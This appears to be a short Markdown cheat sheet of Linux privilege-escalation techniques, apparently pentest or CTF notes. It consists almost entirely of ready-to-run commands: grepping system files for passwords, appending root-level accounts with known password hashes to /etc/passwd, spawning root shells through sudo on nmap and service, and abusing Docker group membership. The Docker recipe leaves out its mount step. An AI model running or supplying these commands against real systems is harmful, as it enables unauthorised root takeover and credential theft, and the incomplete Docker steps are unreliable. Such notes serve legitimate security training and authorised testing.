## Enum
### Find all world-writable files
```
find /bin -perm -o+w -print 2>/dev/null
```

### Find credentials
```
grep -lRi "password" ./etc 2>/dev/null | sort | uniq > files.txt
for p in $(cat files.txt); do grep password $p; done
```

## Linux Root tricks
Tricks to play after running `sudo -l`
https://gtfobins.github.io/

### Change passwd file
```
hack:$1$-hack$cP2Gt085ove2RDgBPWMR2/:0:0:root:/root:/bin/bash
su hack
Password: pass123
```

### Chown
```
sudo chown asterisk:asterisk /etc/passwd
echo "flame:sa/zAjIC0QWtk:0:0::/root/:/bin/bash" >> /etc/passwd
su - flame
Password: flamen
```

### nmap
```
sudo nmap --interactive
!sh
```

### service
```
sudo /sbin/service ../../../bin/bash
```

## Some common exploit

### Docker
How to spot
```
lse check user in docker group
```
Exploit
```
docker images
cd /
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /mnt/etc/passwd
su toor
password
```

### Check sudo
```
sudo -l
```

### no-root-squash nfs
https://book.hacktricks.xyz/linux-unix/privilege-escalation/nfs-no_root_squash-misconfiguration-pe

